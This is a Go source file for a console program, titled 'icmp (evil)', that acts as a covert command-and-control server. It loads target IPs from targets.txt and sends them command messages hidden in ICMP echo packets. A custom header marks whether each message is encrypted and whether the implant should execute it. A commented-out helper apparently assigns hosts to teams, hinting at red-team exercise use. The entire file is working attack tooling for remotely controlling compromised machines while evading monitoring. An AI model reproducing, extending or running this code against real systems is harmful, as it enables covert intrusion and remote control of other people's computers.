package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var clients = make(map[int]string)
var PacketQueue []icmp.Message
var SSM bool = true
var execute = false
var ID int = 0
var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")

func print_title() {
	fmt.Println(".__                          ___             .__.__    ___")
	fmt.Println("|__| ____  __ ________      /  /   _______  _|__|  |   \\  \\")
	fmt.Println("|  _/ ___\\|  |  \\____ \\    /  /  _/ __ \\  \\/ |  |  |    \\  \\")
	fmt.Println("|  \\  \\___|  |  |  |_> >  (  (   \\  ___/\\   /|  |  |__   )  )")
	fmt.Println("|__|\\___  |____/|   __/    \\  \\   \\___  >\\_/ |__|____/  /  /")
	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
	fmt.Println("We are so back.")
	fmt.Println("Type \"help\" for list of commands.")
}

func AddClient(ip string) {
	clients[ID] = ip
	ID++
}

func RemoveClient(id int) {
	_, ok := clients[id]
	if !ok {
		fmt.Println("Invalid ID")
	}
	delete(clients, id)
}

func RemoveAllClients() {
	for k := range clients {
		RemoveClient(k)
	}
}

func ShowClients() {
	for id, ip := range clients {
		fmt.Printf("ID: %d, IP: %s\n", id, ip)
	}
}

func LoadClients() {
	readFile, err := os.Open("targets.txt")
	if err != nil {
		fmt.Println(err)
	}
	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)
	for fileScanner.Scan() {
		AddClient(fileScanner.Text())
	}
}

func GenerateHeader(segment int, segmented bool, ip string) string {
	SegmentNum := strconv.Itoa(segment)
	header := "!!!"
	// ### is server flag, value 1 (SSM) is Encryption option, 2 is execution option
	// 3 is segment for oversized packets, 4 is segment ID
	if SSM {
		header += "1"
	} else {
		header += "0"
	}
	if execute {
		header += "1"
	} else {
		header += "0"
	}
	if segmented {
		header += "1"
	} else {
		header += "0"
	}
	header += SegmentNum
	header += "[" + ip + "]"
	return header
}

func MakePacket(payload string) {
	packet := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   0,
			Seq:  0,
			Data: []byte(payload),
		},
	}
	PacketQueue = append(PacketQueue, packet)
}

func SendPackets(addr string, c icmp.PacketConn) {
	for _, packet := range PacketQueue {
		// fmt.Println("Packet:", addr)
		binaryEncoding, _ := packet.Marshal(nil)
		dst, _ := net.ResolveIPAddr("ip4", addr)
		anInt, err := c.WriteTo(binaryEncoding, dst)

		if err != nil {
			fmt.Println("I FAILED DOG")
		} else if anInt != len(binaryEncoding) {
			fmt.Println("YOU FELL OFF")
		}
	}
}

func Send(message string, id int) {
	if len(message) > 1460 {
		// Handle large payloads
	} else {
		header := GenerateHeader(0, false, clients[id])
		payload := header + message
		MakePacket(payload)
		SendPackets(clients[id], *c)
	}

	fmt.Println("[DEBUG]", message, "sent to client", id, "at", clients[id])
}

func CheckTwoStrings(words []string) bool {
	if len(words) == 1 {
		fmt.Println("Usage: add <IP Address>")
		return false
	}
	words = strings.Split(words[1], " ")
	if len(words) != 1 {
		fmt.Println("Usage: add <IP Address>")
		return false
	}
	return true
}

func ParseID(args []string) (string, int) {
	ParsedArgs := strings.SplitN(args[1], " ", 2)
	id, _ := strconv.Atoi(ParsedArgs[0])
	return ParsedArgs[1], id
}

func main() {
	if ListenerError != nil {
		fmt.Println(ListenerError)
	}
	print_title()
	for {
		consoleReader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		input, err := consoleReader.ReadString('\n')
		input = strings.TrimRight(input, "\r\n")
		if err != nil {
			fmt.Println(err)
		}
		tokens := strings.SplitN(input, " ", 2)

		switch tokens[0] {
		case "add":
			if CheckTwoStrings(tokens) {
				AddClient(tokens[1])
			}
		case "rm":
			if CheckTwoStrings(tokens) {
				id, err := strconv.Atoi(tokens[1])
				if err != nil {
					fmt.Println("Not an ID.")
					continue
				}
				RemoveClient(id)
			}
		case "removeallclients":
			RemoveAllClients()
		case "ls":
			ShowClients()
		case "load":
			LoadClients()
		case "send":
			message, id := ParseID(tokens)
			Send(message, id)
		case "kill":
			print_title()
			os.Exit(0)
		default:
			fmt.Println("Invalid command: [", input, "]")
		}
	}
}

// For later dont even look
// func DisplayHosts(hosts []string, numTeams int) {
// 	hostsPerTeam := len(hosts) / numTeams
// 	teams := make([]string, numTeams)
// 	for i, host := range hosts {
// 		team := i / hostsPerTeam
// 		teams[team] += host + " "
// 	}
// 	for _, team := range teams {
// 		fmt.Println(team)
// 	}
// }
